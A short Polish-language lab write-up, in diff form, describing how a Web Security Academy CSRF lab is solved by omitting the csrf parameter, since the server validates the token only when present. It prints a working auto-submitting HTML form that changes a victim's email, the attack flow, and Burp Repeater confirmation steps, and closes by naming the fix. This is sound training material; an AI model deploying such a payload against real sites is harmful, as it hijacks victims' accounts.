@@ -1,0 +1,54 @@
+
+• Lab został rozwiązany przez całkowite usunięcie parametru csrf.
+
+  Aplikacja miała błędną logikę podobną do:
+
+  jeżeli parametr csrf istnieje:
+      sprawdź token
+  jeżeli nie istnieje:
+      zaakceptuj żądanie
+
+  Na exploit serverze zapisałem:
+
+  <html>
+  <body>
+    <form action="https://0ad900b203eef9c7805303d9002c0067.web-security-academy.net/my-account/change-
+    email"
+          method="POST">
+      <input type="hidden"
+             name="email"
+             value="victim-371952@example.net">
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+  </html>
+
+  Zwróć uwagę, że nie ma tutaj pola:
+
+  <input name="csrf" ...>
+
+  Przebieg:
+
+  Ofiara otwiera exploit
+  → formularz automatycznie wysyła POST
+  → przeglądarka dołącza sesję ofiary
+  → parametr csrf jest nieobecny
+  → serwer pomija walidację tokenu
+  → e-mail zostaje zmieniony
+
+  W Burp Repeater można to wcześniej potwierdzić:
+
+  1. Wyślij żądanie z nieprawidłowym tokenem — zostanie odrzucone.
+  2. Usuń całą parę:
+
+  &csrf=5QpicLpOkuEyK20Z5tyzRsAOSdnwlQ9h
+
+  3. Zostaw samo:
+
+  email=test@example.net
+
+  Jeżeli żądanie przechodzi, ochrona sprawdza token tylko wtedy, gdy został dostarczony. Poprawna
+  aplikacja powinna odrzucać zarówno token błędny, jak i brakujący.
